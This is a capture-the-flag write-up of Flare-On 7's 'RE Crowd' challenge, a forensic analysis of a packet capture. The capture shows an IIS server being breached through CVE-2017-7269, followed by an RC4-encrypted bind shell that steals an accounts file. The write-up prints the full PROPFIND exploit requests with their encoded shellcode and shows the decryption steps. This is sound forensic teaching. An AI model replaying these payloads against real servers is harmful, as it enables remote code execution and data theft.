---
title: "Flare-On 7 — 07 RE Crowd"
date: 2020-10-23T21:29:47+03:00
draft: false
author: "explained.re"
tags: ["flare-on"]
categories: ["write-up", "ctf"]

lightgallery: true

---

{{< admonition info "Challenge Description" >}}

Hello,

Here at Reynholm Industries we pride ourselves on everything.
It's not easy to admit, but recently one of our most valuable servers was breached. 
We don't believe in host monitoring so all we have is a network packet capture.
We need you to investigate and determine what data was extracted from the server, if any.
{{< /admonition >}}

## Getting Started

In the 7th challenge of Flare-On7 we are given with a network capture file `re_crowd.pcapng`. The first thing to do when facing such a file is to open it in Wireshark. There isn't a lot of traffic captured so it is easy to skim through it and spot interesting sessions. Since the challenge description mentioned that data was extracted from one of the servers, it will be good to search for it using Wireshark exported objects feature.

When opening the HTTP Objects dialog, we can see that the website of the IT department was accessed. This seems like a very nice place to start and look for clues that will help us.

{{< image src="images/image.png" >}}

We can export all the objects using the Save All button. Wireshark exported 66 files but most of them are only 67 bytes in size. When focusing on the bigger ones, we are left with few images, HTML and CSS files. The characters in these images are from the popular TV show The IT Crowd.

{{< image src="images/image_1.png" >}}

## The IT Department Website

The bigger HTML file is most likely to be the file to contain most of the data. Let's rename it to "index.html" and open it in the browser. The opened website looks like an internal forum of the IT department of the organization. It will be a wise idea to look for hints in the funny conversations.

{{< image src="images/image_2.png" >}}

In their conversation Jen is asking for a "list of employee's user names and passwords." and Denholm emailed her a file with this information. She then asks for his help and tells him that she left a file named "C:\accounts.txt".

{{< image src="images/image_3.png" >}}

Most likely, "accounts.txt" is one of the stolen data and the file we need to look for. Let's `grep` the pcap file for the string "accounts.txt" and see if there are other mentions to it.

```bash
$ grep -a  "accounts.txt" re_crowd.pcapng 
<p>Roy, can you help me create the accounts? I saved the file to C:\accounts.txt on the server.</p>
```

Sadly, it looks like this is the only mention for this file in cleartext. But it still can be accessible in some kind of encrypted or compressed form. We went over some of the other HTTP objects we exported and didn't spot an interesting lead.

## Extracting Sessions from them PCAP

Without additional lead from the http objects, we decided to use `tshark` and check what other sessions were conducted to the http port. We now see that there were other requests to — "http://192.168.68.1/".

```bash
$ tshark -r re_crowd.pcapng  -T fields -e http.host -e http.request.full_uri -Y 'http'

it-dept.reynholm-industries.com http://it-dept.reynholm-industries.com/
it-dept.reynholm-industries.com http://it-dept.reynholm-industries.com/it.css
it-dept.reynholm-industries.com http://it-dept.reynholm-industries.com/roy.jpg
it-dept.reynholm-industries.com http://it-dept.reynholm-industries.com/richmond.jpg
it-dept.reynholm-industries.com http://it-dept.reynholm-industries.com/moss.jpg
it-dept.reynholm-industries.com http://it-dept.reynholm-industries.com/favicon.ico
it-dept.reynholm-industries.com http://it-dept.reynholm-industries.com/jen.jpg
it-dept.reynholm-industries.com http://it-dept.reynholm-industries.com/denholm.jpg

192.168.68.1    http://192.168.68.1/
192.168.68.1    http://192.168.68.1/
192.168.68.1    http://192.168.68.1/
192.168.68.1    http://192.168.68.1/
192.168.68.1    http://192.168.68.1/
192.168.68.1    http://192.168.68.1/
192.168.68.1    http://192.168.68.1/
192.168.68.1    http://192.168.68.1/
192.168.68.1    http://192.168.68.1/
192.168.68.1    http://192.168.68.1/
[ . . . ]
```

This is interesting! We found another session of some kind. Let's see what requests were sent to it, this might lead to something.

```bash
$ tshark -r re_crowd.pcapng  -T fields -e tcp.payload -Y ip.dst==192.168.68.1 | xxd -r -p

[ . . . ]
PROPFIND / HTTP/1.1
Host: 192.168.68.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Length: 0
If: <http://192.168.68.1:80/AFRPWWBVQzHpAERtoPGOxDTKYBGmrxqhVCdIGMmNDzefUMySmeCdKhFobQXIDkhgEpnMeUniloxaFrfDCCBprACtWhHkrCVphXAmetqJqxATcnu呭䉶奐桮瑔睈摘䩥睋䕆瑄慩睱剳偏剅ȂȂዀ栃䭴扒楩穴剹潄偭祚䭳楸祒啬祹佳瑡浧晓癡潍䩒Ꮐ栃> (Not <locktoken:write1>) <http://192.168.68.1:80/oxamUvbohSEvpUpVuakwGpSnAQoMYMshqrvwwjFDLrhpIfQlgCdAlvwhrhCpWoKXCgOMkAbpjBnwLDdfCGcxCAyShpvGEmVwncZIIFDjgilqkGt䉔畊䝚奥晑杢䱥䉋睰卭䵬癨橘晒Ꮐ栃瞽䩕䱎兪䩓Ꮐ栃婡䅉灉楧䥏楅祴噥悂栁끬瞼瞾╣瞻ᄔ瞺瞻䅁䅁瞻頁瞼≥瞾╣瞻鑯π푁瞽䣓瞻⇠瞿瞻ﰂ瞻瞾谄瞽谅瞽╣瞻鑏π푁瞽芅瞻╣瞻邐邐斑瞾幔욃䄊VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA>

PROPFIND / HTTP/1.1
Host: 192.168.68.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Length: 0
If: <http://192.168.68.1:80/WsefAxilkGVvpkTNoNITajXcNFUWSOjahaRQsWxCLRPPZjLuUpgTjHfxYEmSZTZUIjSEzKunxuxzCOIIvpcfJShvjajxnUMPuPgwwpdnSFFCGn偂䙥獖济睫契假䩱䱕䑖敢䙅摺䅮䉔啬ȂȂዀ栃婅测睰䵵湪獸䭰灶湦獄婆摍䝇捯䩶橎祍䕎䡡䵱Ꮐ栃> (Not <locktoken:write1>) <http://192.168.68.1:80/RMtXSTJXbMSGxfOgttEzSJwDBIpoPCdanfueAGBGDSHhDgOVVOqzLXZJBmJaJmfPrpaipWixTlPSJFydNKyYaQQbKNKVsOWtahFSKCArVxfoTC歓灂奸穷杯佅䑣杄䱍卧煃硏䙅桩Ꮐ栃瞽獅桓畁煹Ꮐ栃扱塷䉶䥗坰䝫䙒歇悂栁끬瞼瞾╣瞻ᄔ瞺瞻䅁䅁瞻頁瞼≥瞾╣瞻鑯π푁瞽䣓瞻⇠瞿瞻ﰂ瞻瞾谄瞽谅瞽╣瞻鑏π푁瞽芅瞻╣瞻邐邐斑瞾幔욃䄊VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA>

PROPFIND / HTTP/1.1
Host: 192.168.68.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Length: 0
If: <http://192.168.68.1:80/jCwMtOXAZueJjMrPAYIqqhXCMGbVrxrbKMffGnjsRuSnGUVBVHWxecWPCuTypYDWUunOijmZBVIfhcNTweBAAUaxBRaPLOAorHymHoQRXCwPJ浆噤䵳側杬穦睔䑬偉䭴䑐硉獹祑乗桬ȂȂዀ栃煓煹牲䭄汖婈杊呧硄獃䭃䵓癙穭偄䵷捆汇灵佳Ꮐ栃> (Not <locktoken:write1>) <http://192.168.68.1:80/LmMifKZvyqYNQiZgFcAGacIPzwqrMijADZQuSaIwoDOQVoXlTEExkMuABTTsSpniZMNunpwayJXkmbhAVOIzCmCqiNXzyVUCsNwUITiTqBLIm楖桃䍵睖䙥噂䵢䍏䅖䡓啡橤䥯特Ꮐ栃瞽牳瑲䉭摄Ꮐ栃乚癃䙪䵬獦坚慯乴悂栁끬瞼瞾╣瞻ᄔ瞺瞻䅁䅁瞻頁瞼≥瞾╣瞻鑯π푁瞽䣓瞻⇠瞿瞻ﰂ瞻瞾谄瞽谅瞽╣瞻鑏π푁瞽芅瞻╣瞻邐邐斑瞾幔욃䄊VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA>

[ . . . ]
```

We found dozens of very suspicious requests to the server. This looks like an exploitation attempt or data exfiltration. We've never seen requests of this kine and we decided to google for some of the keywords in the request `(Not <locktoken:write1>)`.

Googling for this keyword brought us immediately to CVE-2017-7269 — a vulnerability in IIS. This must be it. When reading about this vulnerability online we saw that it targets 32 bit IIS servers. The exploit is publicly available in multiple repositories on Github, including Metasploit's. The challenge author must have used one of these implementations. From the different implementation, we understood that the exploit is using a shellcode with ROP and alphanumeric encodind to eventually execute a remote shell on the victim. 

Let's grab the shellcode and open it in radare2.

```bash
$ cat shellcode.bin 
VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA
$ r2 -b 32 shellcode.bin
[0x00000000]> pd 10
            0x00000000      56             push esi
            0x00000001      56             push esi
            0x00000002      59             pop ecx
            0x00000003      41             inc ecx
            0x00000004      49             dec ecx
            0x00000005      41             inc ecx
            0x00000006      49             dec ecx
            0x00000007      41             inc ecx
            0x00000008      49             dec ecx

```

Since the shellcode is encoded using the Metasploit's [alpha_mixed](https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/) encoding we can't easily analyze the shellcode. It will be a good idea to decode it using a decoder for this encoding. Such a project is available here: [https://github.com/axfla/Metasploit-AlphanumUnicodeMixed-decoder/blob/master/dcode.py](https://github.com/axfla/Metasploit-AlphanumUnicodeMixed-decoder/blob/master/dcode.py).

We inserted our shellcode to the original script and modified it a little bit to print only the decoded shellcode. Then, we wrote the results to a file and ran `strings` on it. The command gave us some interesting results like `ws2_32` which is a Windows networking library, `KXOR` and `killervulture123` that look like some keys.

```bash
$ python2 decode.py | xxd -r -p > decoded.bin
$ strings decoded.bin 
aTjRb\iYaYaYxQjQ
YYYYAQ
RRRR
]h32
hws2_ThLw&
TPh)
PPPP@P@Ph
KXOR
killervulture123^1
```

We quickly analyzed the shellcode using radare2 and noticed it was built by another popular utility from Metasploit: [https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/bind_tcp_rc4.rb](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/bind_tcp_rc4.rb)

By reading the attached source we learned that it is used for an RC4 encrypted remote shell communication. If we will find the remote shell packets between the attacker and the victim we will be able to extract the payloads.

To do this, we need to search for non `http` sessions in the pcap:

```bash
$ tshark -q -z conv,tcp -r re_crowd.pcapng  | grep -v 80
================================================================================
TCP Conversations
Filter:<No Filter>
                                                           |       <-      | |       ->      | |     Total     |    Relative    |   Duration   |
                                                           | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |      Start     |              |
192.168.68.1:2927          <-> 192.168.68.21:1337               3       182       5       484       8       666    16.829064000         0.0016
192.168.68.21:4444         <-> 192.168.68.1:2926                3       170       2      1359       5      1529    16.827242000         0.1136
================================================================================
```

We can see two sessions between `192.168.68.21` and `192.168.68.1` on ports 1337 and 4444. Let's dump these sessions that contain the communications between the two.

```bash
$ tshark -r re_crowd.pcapng -Y "tcp.port == 1337" -T fields -e data > server_to_attacker.bin                                                              

# This is from the server to the attacker
43665783a5238977beac1b1f878f58933f24cf2cd39aa8d111c4bca67fcd38dbb33c034babf560c560d20d1d1888415b4f06176c9e0b01739d836018fa8bfff84d78b2a4246faebd92d1eccc2d7c8bbfd08cbde245ef15b288bca459be20acf957df10babcd911934119009c0225efc44a26fd25ca9b8519644ec5849fa100182c6830dc704cfe83f1c7002b497a830905776e0a088d56e4387e880f2c41e43366c9bc06aa2aa1962d94c008161ea4f2811a83f77cb57d6313004196ca6980ae49e95d0f7d8943d4891a01b46161

$ tshark -r re_crowd.pcapng -Y "tcp.port == 4444" -T fields -e data > attacker_to_server.bin

# This is from the attacker to the server
9c5c4f52a4b1037390e4c88e97b0c95bc630dc6abdf4203886f93026afedd0881b924fe509cd5c2ef5e168f8082b48daf7599ad4bb9219ae107b6eed7b6db1854d1031d28a4e7f268b10fdf41cc17fab5a739202c0cb49d953d6df6c0381a021016e875f09fe9a699435844f01966e77eca3f3f52f6a3636ab4775b580cb47bd9f7638a54048579c36ad8e7945a320faed1f1849b88918482b5b6feef4c3d6dccc84eab10109b1314ba4055098b073ae9c14101b65bd93826c57b9757a2aeede10fb39ba96d0361fc2312cc54f33a513e1595692c51fa54e0e626edb5be87f8d01a67d012b02431f54b9bcd5ef2db3daef3dd068fedade60b117feea204a2ca1bba1b5c51292a9dbf111e38c58badc3d288666c86d0eabfa83d5246010681dc7afc7ac4513a3d972e7cc5179f567417cae7fc87e954609f6ef4b4502745210501cb76a7ceb00d759c3290237d0472e1e3af7e6ac821474eb4f6b572213f6f248d66bcbb4eda73268cbd06642d3c5f2c537df7d9f9f28c0743abeb8c0a773d0bbfa507c101edab123d6c481a5d3b62229096b21a65c38c6803dbe0823c7b11f6de6646695dc10a71342cd3bfadcda148dd05ac88135542fb5dc61d6287788c55870b52fcfea4f4d85560407f39074ce5d3c8a2b06b49fe66d79c06e3dd83e2008b7743d3699cd7f607d9cc9b3ad0c8e456dea3ddd091dda0b3a1cfccb8148ed5afacef8c623b01e2644a3d9ab0ed598b133655ded6ad3237f024ab3a2f81d7ed12f5fbe89615e2ce4b89619e549764e7ae892a370556f7d3cf9c1364469337ddf7937b8e0aae86a5dc93b180f4e283a31a87fefb819ac3663e889214d83a77e5703489be1279306e43b675fe56950003e8b01b7efa6b54b3682d4fb9fde8b27cca457ce2537445042f77ea2bf4fdf0f72d8664a3ef5c8262ac5887b97ab235b2b61d83f00370e7e14fafd7df78149c2a1851bd028bea524fd60b278274eace8793b3b7adc56d076c5010fcf43b5d45f4870bdac6576db113b5bcf9c528b001e83f1fa925b7779076ae0d4339a71ba24a5a5c8eb4c01b3d3cd2c228c0b4ccd2d5a8c9ab167707f7596e256c11dff057e77a2bae59aaef9f8b2f178d2b1dce903c2d4ff1f66cdb047f0b4d1f672fa1eb7f14de76e4210ec5d9430dd7f751c014546b6146cf7453658eceff337049c21eb9454a3fe23cbbb315c6275bded2790fe9117e2ae429b7904d15cefcd4b86934a74412dad0b351d81fd102c8efd8c681df5450ab5b409be0efafad2f74e58d83c1a1b113d992553ab78ac5449bb2a42b38066b563e290f8a58f37af97132be8fc5d4b718b4d9fc8ec07281fcb30921e6ddcb9de94b8e9cb5af7a2b0bb0fc338b727331be9bf452d863e346d12f6051227c528e4d261267e992b3f1f034d7972b983566d8e8233c209eb214a0c13adea291b58da10164320557df4b7fc2634688ba054af07d5d523b523b8fb07c6644a567fa06d867c333b23b79d9ca822b1799f00e776e9c768ae5c23ae9fc6459148836fbf0ad8c977ab2c2d8547bfe9818013d9dc1c210ff4c7790752a8068c576353b2fb7dbe6c1aae2ebdc6fd970a04edc0a30545db9b62bd34a9082553009036cfd96315a5f7f8e0d869fd7924607ba2aebdf2b4b9c2088465a96deba5d872a7b65921b9f411125d391d15756d8a2f58c2fc80025178a9fc7dde0d85a55718f8f0cc8e4c5ed76558744e8a4433a224e3565768babbf2b23298f1882ec3

```


## Decrypting the Sessions
From the code of the shellcode on Github we understand that the first 4 bytes are the length, encrypted with a key `KXOR` and the next is an rc4 encrypted second-stage payload that was sent form the attacker to the server. The key is `killervulture123`.

Let's decrypt it using RC4 and the key, starting from the fifth byte:

```python
from malduck import rc4, unhex

key = b"killervulture123"
from_attacker = open("attacker_to_server.bin", "rb").read().strip()
from_attacker_bytes = unhex(from_attacker)
decrypted_message = rc4(key, from_attacker_bytes[4:])
open('second_stage.bin', 'wb').write(decrypted_message)
```

We received the second stage. Like before, we should get a shellcode that encrypts traffic from the server to the attacker using RC4. Let's run the `strings` command on it.

```bash
strings second_stage.bin 
SVWU
SVWU
SVWU
SVWU
A,f;
SVWU
SVWU
j_Mn
C:\accounts.txt
intrepidmango
```

Cool! We can see "C:\accounts.txt" which is the file we were looking for, in addition to something that looks like the RC4 key — "intrepidmango". This is great. We can assume we now have the second key, to decrypt the message from the server to the attacker, which will probably contain the flag. Let's use it to decrypt the other packet we dumped.

```python
from malduck import rc4, unhex

from_server = open("server_to_attacker.bin", "rb").read().strip()
from_server_bytes = unhex(from_server)
key2 = b"intrepidmango"
print( rc4(key2, from_server_bytes).decode())

# roy:h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com:goat
# moss:Pot-Pocket-Pigeon-Hunt-8:narwhal
# jen:Straighten-Effective-Gift-Pity-1:bunny
# richmond:Inventor-Hut-Autumn-Tray-6:bird
# denholm:123:dog
```

Flag: `h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com`